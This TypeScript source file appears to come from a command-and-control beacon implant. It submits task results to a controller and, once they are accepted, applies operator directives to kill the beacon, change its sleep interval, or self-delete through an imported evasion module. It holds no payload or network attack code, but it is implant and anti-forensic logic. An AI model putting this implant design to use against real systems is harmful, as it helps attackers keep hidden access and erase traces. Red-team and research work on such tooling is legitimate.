import type { TaskResult } from "@octoc2/shared";
import type { BeaconState } from "../state/BeaconState.ts";
import { selfDelete } from "../evasion/OpenHulud.ts";
import type {
  AppliedDirectiveEffect,
  SelfDeleteOutcome,
} from "./TaskDirective.ts";

export interface ResultSubmitter {
  submitResult(result: TaskResult): Promise<{
    artifactWritten: boolean;
    controllerAccepted: boolean;
  }>;
}

export interface SubmitAndApplyOptions {
  submitter: ResultSubmitter;
  state: BeaconState;
  result: TaskResult;
  selfDeleteAction?: () => Promise<SelfDeleteOutcome>;
}

export interface SubmitAndApplyOutcome {
  artifactWritten: boolean;
  controllerAccepted: boolean;
  effect: AppliedDirectiveEffect;
}

/**
 * Submit a signed result before applying any control-flow or filesystem
 * directive. Merely writing an asynchronous channel artifact is insufficient:
 * the controller must explicitly confirm acceptance first.
 */
export async function submitAndApplyDirective(
  options: SubmitAndApplyOptions,
): Promise<SubmitAndApplyOutcome> {
  const submission = await options.submitter.submitResult(options.result);
  if (!submission.controllerAccepted) {
    return { ...submission, effect: { kind: "none" } };
  }

  await options.state.persistResultSubmitted(options.result.taskId);
  const effect = await applyPendingDirective({
    state: options.state,
    taskId: options.result.taskId,
    ...(options.selfDeleteAction && {
      selfDeleteAction: options.selfDeleteAction,
    }),
  });
  return { ...submission, effect };
}

export interface ApplyPendingDirectiveOptions {
  state: BeaconState;
  taskId: string;
  selfDeleteAction?: () => Promise<SelfDeleteOutcome>;
}

export async function applyPendingDirective(
  options: ApplyPendingDirectiveOptions,
): Promise<AppliedDirectiveEffect> {
  const directive = options.state.getPendingDirective(options.taskId);
  if (directive.kind === "none") {
    return directive;
  }

  switch (directive.kind) {
    case "kill": {
      await options.state.persistDirectiveEffect(options.taskId);
      return directive;
    }
    case "update_sleep": {
      await options.state.persistDirectiveEffect(options.taskId);
      return directive;
    }
    case "self_delete": {
      const outcome = await (options.selfDeleteAction ?? selfDelete)();
      if (outcome.success) {
        await options.state.persistDirectiveEffect(options.taskId);
      }
      return {
        kind: "self_delete",
        ...outcome,
      };
    }
  }
}

export async function resumeAcknowledgedDirectives(
  state: BeaconState,
  selfDeleteAction?: () => Promise<SelfDeleteOutcome>,
  skipTaskIds: ReadonlySet<string> = new Set(),
): Promise<Array<{
  taskId: string;
  effect: AppliedDirectiveEffect;
}>> {
  const outcomes: Array<{
    taskId: string;
    effect: AppliedDirectiveEffect;
  }> = [];
  for (const { taskId } of state.listPendingAcknowledgedDirectives()) {
    if (skipTaskIds.has(taskId)) continue;
    outcomes.push({
      taskId,
      effect: await applyPendingDirective({
        state,
        taskId,
        ...(selfDeleteAction && { selfDeleteAction }),
      }),
    });
  }
  return outcomes;
}

export async function retryPendingResults(options: {
  submitter: ResultSubmitter;
  state: BeaconState;
  selfDeleteAction?: () => Promise<SelfDeleteOutcome>;
}): Promise<Array<{
  taskId: string;
  outcome: SubmitAndApplyOutcome;
}>> {
  const outcomes: Array<{
    taskId: string;
    outcome: SubmitAndApplyOutcome;
  }> = [];
  for (const result of options.state.listPendingResults()) {
    outcomes.push({
      taskId: result.taskId,
      outcome: await submitAndApplyDirective({
        submitter: options.submitter,
        state: options.state,
        result,
        ...(options.selfDeleteAction && {
          selfDeleteAction: options.selfDeleteAction,
        }),
      }),
    });
  }
  return outcomes;
}
